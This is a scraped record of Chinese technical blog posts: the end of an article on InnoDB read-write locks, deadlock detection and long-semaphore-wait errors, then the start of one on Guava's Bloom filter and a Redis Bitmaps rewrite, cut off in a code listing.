R4请求发现lock_word小于0，则都等待在条件变量event上，并且设置waiter为1，表示有等待者。假设R1先释放读锁(lock_word递增1)，R2后释放(lock_word再次递增1)。R2释放后，由于lock_word变为0了，其会在wait_ex_event上调用<code>os_event_set</code>，这样W3就被唤醒了，他可以执行临界区内的代码了。W3执行完后，lock_word被恢复为X_LOCK_DECR，然后其发现waiter为1，表示在其后面有新的读写加锁请求在等待，然后在event上调用<code>os_event_set</code>，这样R3, W2, W3, R4同时被唤醒，进行原子操作执行权限争抢(可以简单的理解为谁先得到cpu调度)。假设W2首先抢到了执行权限，其会把lock_word再次递减为0并自己的线程id记录在writer_thread这个变量里，当检查lock_word的时候，发现值为0，表示前面没有读请求了，于是其就进入临界区执行代码了。假设此时，W3得到了cpu的调度，由于lock_word只有在大于0的情况下才能递减，所以其递减lock_word失败，但是其通过对比writer_thread和自己的线程id，发现前面的写锁是自己加的，如果这个时候开启了递归写锁，即recursive值为true，他把lock_word再次递减X_LOCK_DECR（现在lock_word变为-X_LOCK_DECR了），然后进入临界区执行代码。这样就保证了同一个线程多次加写锁也不发生死锁，也就是递归锁的概念。后续的R3和R4发现lock_word小于等于0，就直接等待在event条件变量上，并设置waiter为1。直到W2和W3都释放写锁，lock_word又变为X_LOCK_DECR，最后一个释放的，检查waiter变量发现非0，就会唤醒event上的所有等待者，于是R3和R4就可以执行了。<br>\n读写锁的核心函数函数结构跟InnoDB自旋互斥锁的基本相同，主要的区别就是用<code>rw_lock_x_lock_low</code>和<code>rw_lock_s_lock_low</code>替换了<code>__sync_lock_test_and_set</code>原子操作。<code>rw_lock_x_lock_low</code>和<code>rw_lock_s_lock_low</code>就按照上述的lock_word的变化规则来原子的改变（依然使用了<code>__sync_lock_test_and_set</code>）lock_word这个变量。</p>\n<p>在MySQL 5.7中，读写锁除了可以加读锁(Share lock)请求和加写锁(exclusive lock)请求外，还可以加share exclusive锁请求，锁兼容性如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39b4de339855810247\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n LOCK COMPATIBILITY MATRIX\r\n    S SX  X\r\n S  +  +  -\r\n SX +  -  -\r\n X  -  -  -</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de339855810247-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de339855810247-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de339855810247-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de339855810247-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de339855810247-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39b4de339855810247-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">LOCK </span><span class=\"crayon-e\">COMPATIBILITY </span><span class=\"crayon-i\">MATRIX</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de339855810247-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SX</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">X</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de339855810247-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de339855810247-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SX</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de339855810247-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>按照WL#6363的说法，是为了修复index-&gt;lock这个锁的冲突。</p>\n<h2 id=\"辅助结构\">辅助结构</h2>\n<p>InnoDB同步机制中，还有很多使用的辅助结构，他们的作用主要是为了监控方便和死锁的预防和检测。这里主要介绍sync array, sync thread level array和srv_error_monitor_thread。<br>\nsync array主要的数据结构是sync_array_t，可以把他理解为一个数据，数组中的元素为sync_cell_t。当一个锁（InnoDB自旋互斥锁或者InnoDB读写锁，下同）需要发生<code>os_event_wait</code>等待时，就需要在sync array中申请一个sync_cell_t来保存当前的信息，这些信息包括等待锁的指针（便于死锁检测），在哪一个文件以及哪一行发生了等待（也就是mutex_enter, rw_lock_s_lock或者rw_lock_x_lock被调用的地方，只在debug模式下有效），发生等待的线程（便于死锁检测）以及等待开始的时间（便于统计等待的时间）。当锁释放的时候，就把相关联的sync_cell_t重置为空，方便复用。sync_cell_t在sync_array_t中的个数，是在初始化同步模块时候就指定的，其个数一般为OS_THREAD_MAX_N，而OS_THREAD_MAX_N是在InnoDB初始化的时候被计算，其包括了系统后台开启的所有线程，以及max_connection指定的个数，还预留了一些。由于一个线程在某一个时刻最多只能发生一个锁等待，所以不用担心sync_cell_t不够用。从上面也可以看出，在每个锁进行等待和释放的时候，都需要对sync array操作，因此在高并发的情况下，单一的sync array可能成为瓶颈，在MySQL 5.6中，引入了多sync array, 个数可以通过innodb_sync_array_size进行控制，这个值默认为1，在高并发的情况下，建议调高。</p>\n<p>InnoDB作为一个成熟的存储引擎，包含了完善的死锁预防机制和死锁检测机制。在每次需要锁等待时，即调用<code>os_event_wait</code>之前，需要启动死锁检测机制来保证不会出现死锁，从而造成无限等待。在每次加锁成功（lock_word递减后，函数返回之前）时，都会启动死锁预防机制，降低死锁出现的概率。当然，由于死锁预防机制和死锁检测机制需要扫描比较多的数据，算法上也有递归操作，所以只在debug模式下开启。<br>\n死锁检测机制主要依赖sync array中保存的信息以及死锁检测算法来实现。死锁检测机制通过sync_cell_t保存的等待锁指针和发生等待的线程以及教科书上的有向图环路检测算法来实现，具体实现在<code>sync_array_deadlock_step</code>和<code>sync_array_detect_deadlock</code>中实现，仔细研究后发现个小问题，由于<code>sync_array_find_thread</code>函数仅仅在当前的sync array中遍历，当有多个sync array时（innodb_sync_array_size &gt; 1）,如果死锁发生在不同的sync array上，现有的死锁检测算法将无法发现这个死锁。<br>\n死锁预防机制是由sync thread level array和全局锁优先级共同保证的。InnoDB为了降低死锁发生的概率，上层的每种类型的锁都有一个优先级。例如回滚段锁的优先级就比文件系统page页的优先级高，虽然两者底层都是InnoDB互斥锁或者InnoDB读写锁。有了这个优先级，InnoDB规定，每个锁创建是必须制定一个优先级，同一个线程的加锁顺序必须从优先级高到低，即如果一个线程目前已经加了一个低优先级的锁A，在释放锁A之前，不能再请求优先级比锁A高(或者相同)的锁。形成死锁需要四个必要条件，其中一个就是不同的加锁顺序，InnoDB通过锁优先级来降低死锁发生的概率，但是不能完全消除。原因是可以把锁设置为SYNC_NO_ORDER_CHECK这个优先级，这是最高的优先级，表示不进行死锁预防检查，如果上层的程序员把自己创建的锁都设置为这个优先级，那么InnoDB提供的这套机制将完全失效，所以要养成给锁设定优先级的好习惯。sync thread level array是一个数组，每个线程单独一个，在同步模块初始化时分配了OS_THREAD_MAX_N个，所以不用担心不够用。这个数组中记录了某个线程当前锁拥有的所有锁，当新加了一个锁B时，需要扫描一遍这个数组，从而确定目前线程所持有的锁的优先级都比锁B高。</p>\n<p>最后，我们来讲讲srv_error_monitor_thread这个线程。这是一个后台线程，在InnoDB启动的时候启动，每隔1秒钟执行一下指定的操作。跟同步模块相关的操作有两点，去除无限等待的锁和报告长时间等待的异常锁。<br>\n去除无线等待的锁，如上文所属，就是sync_arr_wake_threads_if_sema_free这个函数。这个函数通过遍历sync array，如果发现锁已经可用(<code>sync_arr_cell_can_wake_up</code>)，但是依然有等待者，则直接调用<code>os_event_set</code>把他们唤醒。这个函数是为了解决由于cpu乱序执行或者编译器指令重排导致锁无限等待的问题，但是可以通过内存屏障技术来避免，所以可以去掉。<br>\n报告长时间等待的异常锁，通过sync_cell_t里面记录的锁开始等待时间，我们可以很方便的统计锁等待发生的时间。在目前的实现中，当锁等待超过240秒的时候，就会在错误日志中看到信息。如果同一个锁被检测到等到超过600秒且连续10次被检测到，则InnoDB会通过assert来自杀。。。相信当做运维DBA的同学一定看到过如下的报错：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39b4de347534307207\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nInnoDB: Warning: a long semaphore wait:\r\n--Thread 139774244570880 has waited at log0read.h line 765 for 241.00 seconds the semaphore:\r\nMutex at 0x30c75ca0 created file log0read.h line 522, lock var 1 \r\nLast time reserved in file /home/yuhui.wyh/mysql/storage/innobase/include/log0read.h line 765, waiters flag 1\r\nInnoDB: ###### Starts InnoDB Monitor for 30 secs to print diagnostic info:\r\nInnoDB: Pending preads 0, pwrites 0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de347534307207-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de347534307207-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de347534307207-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de347534307207-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de347534307207-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de347534307207-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39b4de347534307207-1\"><span class=\"crayon-v\">InnoDB</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Warning</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">semaphore </span><span class=\"crayon-v\">wait</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de347534307207-2\"><span class=\"crayon-o\">--</span><span class=\"crayon-i\">Thread</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">139774244570880</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">has </span><span class=\"crayon-e\">waited </span><span class=\"crayon-e\">at </span><span class=\"crayon-v\">log0read</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">line</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">765</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">241.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">seconds </span><span class=\"crayon-e\">the </span><span class=\"crayon-v\">semaphore</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de347534307207-3\"><span class=\"crayon-e\">Mutex </span><span class=\"crayon-i\">at</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x30c75ca0</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">created </span><span class=\"crayon-e\">file </span><span class=\"crayon-v\">log0read</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">line</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">522</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lock </span><span class=\"crayon-t\">var</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de347534307207-4\"><span class=\"crayon-e\">Last </span><span class=\"crayon-e\">time </span><span class=\"crayon-e\">reserved </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">yuhui</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">wyh</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">storage</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">innobase</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log0read</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">line</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">765</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">waiters </span><span class=\"crayon-i\">flag</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de347534307207-5\"><span class=\"crayon-v\">InnoDB</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">###### Starts InnoDB Monitor for 30 secs to print diagnostic info:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de347534307207-6\"><span class=\"crayon-v\">InnoDB</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pending </span><span class=\"crayon-i\">preads</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pwrites</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>一般出现这种错误都是pread或者pwrite长时间不返回，导致锁超时。至于pread或者pwrite长时间不返回的root cause常常是有很多的读写请求在极短的时间内到达导致磁盘扛不住或者磁盘已经坏了。。。</p>\n<h2 id=\"总结\">总结</h2>\n<p>本文详细介绍了原子操作，条件变量，互斥锁以及读写锁在InnoDB引擎中的实现。原子操作由于其能减少不必要的用户态和内核态的切换以及更精简的cpu指令被广泛的应用到InnoDB自旋互斥锁和InnoDB读写锁中。InnoDB条件变量使用更加方便，但是一定要注意条件通知必须在条件等待之后，否则会有无限等待发生。InnoDB自旋互斥锁加锁和解锁过程虽然复杂但是都是必须的操作。InnoDB读写锁神奇的lock_word控制方法给我们留下了深刻影响。正因为InnoDB底层同步机制的稳定、高效，MySQL在我们的服务器上才能运行的如此稳定。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113301\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113301votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113301\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "开发", "front_image_url": ["http://www.fullstackyang.com/wp-content/uploads/2017/09/bloom-filter.jpg"], "title": "布隆过滤器:Google Guava类库源码分析及基于Redis Bitmaps的重构", "fav_nums": 3, "url": "http://blog.jobbole.com/113396/", "create_date": "2017/12/30", "url_object_id": "e8eb842f84448b7433a380c11c41c941", "comment_nums": 0, "front_image_path": "full/98bb9228f02f68efac9268ed6a26dad9a00ce1c5.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/2653yy\">fullstackyang</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><blockquote><p>本文源地址：http://www.fullstackyang.com/archives/464.html，转发请注明该地址或伯乐在线地址，谢谢！</p></blockquote>\n<p><span style=\"font-family: 'Microsoft YaHei', 宋体, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: normal;\">一、背景知识</span></p>\n<p>在网上已经有很多关于布隆过滤器的介绍了，这里就不再赘述，下面简单地提炼几个要点：</p>\n<ol>\n<li>布隆过滤器是用来判断一个元素是否出现在给定集合中的重要工具，具有快速，比哈希表更节省空间等优点，而缺点在于有一定的误识别率（false-positive，假阳性），亦即，它可能会把不是集合内的元素判定为存在于集合内，不过这样的概率相当小，在大部分的生产环境中是可以接受的；</li>\n<li>其原理比较简单，如下图所示，S集合中有n个元素，利用k个哈希函数，将S中的每个元素映射到一个长度为m的位（bit）数组B中不同的位置上，这些位置上的二进制数均置为1，如果待检测的元素经过这k个哈希函数的映射后，发现其k个位置上的二进制数不全是1，那么这个元素一定不在集合S中，反之，该元素可能是S中的某一个元素（参考1）；\n<div><img src=\"http://www.fullstackyang.com/wp-content/uploads/2017/09/bloom-filter.jpg\" alt=\"\" width=\"882\" height=\"476\"></div>\n</li>\n<li>综上描述，那么到底需要多少个哈希函数，以及创建长度为多少的bit数组比较合适，为了估算出k和m的值，在构造一个布隆过滤器时，需要传入两个参数，即可以接受的误判率fpp和元素总个数n（不一定完全精确）。至于参数估计的方法，有兴趣的同学可以参考维基英文页面，下面直接给出公式：<img src=\"http://www.fullstackyang.com/wp-content/uploads/2017/09/km.jpg\" alt=\"\" width=\"346\" height=\"56\"></li>\n<li>哈希函数的要求尽量满足平均分布，这样既降低误判发生的概率，又可以充分利用bit数组的空间；</li>\n<li>\n<div>根据论文《Less Hashing, Same Performance: Building a Better Bloom Filter》提出的一个技巧，可以用2个哈希函数来模拟k个哈希函数，即gi(x) = h1(x) + ih2(x) ，其中0&lt;=i&lt;=k-1；</div>\n</li>\n<li>在吴军博士的《数学之美》一书中展示了不同情况下的误判率，例如，假定一个元素用16位比特，8个哈希函数，那么假阳性的概率是万分之五，这已经相当小了。</li>\n</ol>\n<p>目前已经有相应实现的开源类库，如Google的Guava类库，Twitter的Algebird类库，和ScalaNLP breeze等等，其中Guava 11.0版本中增加了BloomFilter类，它使用了Funnel和Sink的设计，增强了泛化的能力，使其可以支持任何数据类型，其利用murmur3 hash来做哈希映射函数，不过它底层并没有使用传统的java.util.BitSet来做bit数组，而是用long型数组进行了重新封装，大部分操作均基于位的运算，因此能达到一个非常好的性能；下面我们就Guava类库中实现布隆过滤器的源码作详细分析，最后出于灵活性和解耦等因素的考虑，我们想要把布隆过滤器从JVM中拿出来，于是利用了Redis自带的Bitmaps作为底层的bit数组进行重构，另外随着插入的元素越来越多，当实际数量远远大于创建时设置的预计数量时，布隆过滤器的误判率会越来越高，因此在重构的过程中增加了自动扩容的特性，最后通过测试验证其正确性。</p>\n<h2>二、布隆过滤器在Guava中的实现</h2>\n<p>Guava中，布隆过滤器的实现主要涉及到2个类，BloomFilter和BloomFilterStrategies，首先来看一下BloomFilter：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1a1999545802\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n /** The bit set of the BloomFilter (not necessarily power of 2!) */\r\n  private final BitArray bits;\r\n\r\n  /** Number of hashes per element */\r\n  private final int numHashFunctions;\r\n\r\n  /** The funnel to translate Ts to bytes */\r\n  private final Funnel&lt;? super T&gt; funnel;\r\n\r\n  /**\r\n   * The strategy we employ to map an element T to {@ code numHashFunctions} bit indexes.\r\n   */\r\n  private final Strategy strategy;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1a1999545802-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1a1999545802-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-c\">/** The bit set of the BloomFilter (not necessarily power of 2!) */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1a1999545802-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1a1999545802-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1a1999545802-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-c\">/** Number of hashes per element */</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1a1999545802-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span 